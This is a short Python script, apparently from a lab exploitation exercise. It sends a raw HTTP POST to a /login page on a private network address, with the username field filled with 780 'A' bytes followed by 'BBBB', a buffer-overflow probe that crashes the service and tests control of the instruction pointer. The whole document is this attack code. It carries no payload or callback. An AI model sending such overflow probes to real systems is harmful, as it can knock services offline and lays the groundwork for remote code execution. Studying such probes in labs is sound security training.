import socket


dados = b"A" * 780 + b"BBBB"


request=b"POST /login HTTP/1.1\r\n"
request+=b"Host: 192.168.x.x\r\n"
request+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0\r\n"
request+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
request+=b"Accept-Language: en-US,en;q=0.5\r\n"
request+=b"Accept-Encoding: gzip, deflate, br\r\n"
request+=b"Content-Type: application/x-www-form-urlencoded\r\n"
request+=b"Content-Length: 804\r\n"
request+=b"Origin: http://192.168.x.x\r\n"
request+=b"Connection: keep-alive\r\n" 
request+=b"Referer: http://192.168.90.42/login\r\n"
request+=b"Upgrade-Insecure-Requests: 1\r\n"
request+=b"Priority: u=0, i\r\n"
request+=b"\r\n"
request+=b"username="+dados+b"&password=A"

cliente = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cliente.connect(("192.168.x.x",80)) 
cliente.send(request)
